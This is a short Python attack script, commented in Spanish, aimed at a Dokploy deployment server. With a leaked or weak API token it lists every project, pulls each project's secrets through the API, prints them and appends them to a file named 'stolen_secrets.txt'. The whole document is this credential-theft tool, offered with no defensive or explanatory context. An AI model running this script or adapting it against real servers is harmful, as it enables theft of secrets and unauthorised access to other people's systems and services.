import requests
import json

def dokploy_secrets_attack():
    # Configuración (reemplazar con valores reales)
    dokploy_url = "http://dokploy-server:3000"
    api_token = " leaked_or_weak_api_token"
    
    # Headers para autenticación
    headers = {
        "Authorization": f"Bearer {api_token}",
        "Content-Type": "application/json"
    }
    
    try:
        # Obtener lista de proyectos
        projects_url = f"{dokploy_url}/api/projects"
        response = requests.get(projects_url, headers=headers)
        
        if response.status_code == 200:
            projects = response.json()
            print(f"[+] Encontrados {len(projects)} proyectos")
            
            # Exfiltrar secretos de cada proyecto
            for project in projects:
                project_id = project["id"]
                secrets_url = f"{dokploy_url}/api/projects/{project_id}/secrets"
                
                secrets_response = requests.get(secrets_url, headers=headers)
                if secrets_response.status_code == 200:
                    secrets = secrets_response.json()
                    print(f"[+] Secretos del proyecto {project['name']}:")
                    
                    for secret in secrets:
                        print(f"  - {secret['name']}: {secret['value']}")
                        
                        # Guardar secretos en archivo
                        with open("stolen_secrets.txt", "a") as f:
                            f.write(f"{project['name']}.{secret['name']}: {secret['value']}\n")
                else:
                    print(f"[-] Error obteniendo secretos: {secrets_response.status_code}")
        else:
            print(f"[-] Error obteniendo proyectos: {response.status_code}")
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    dokploy_secrets_attack()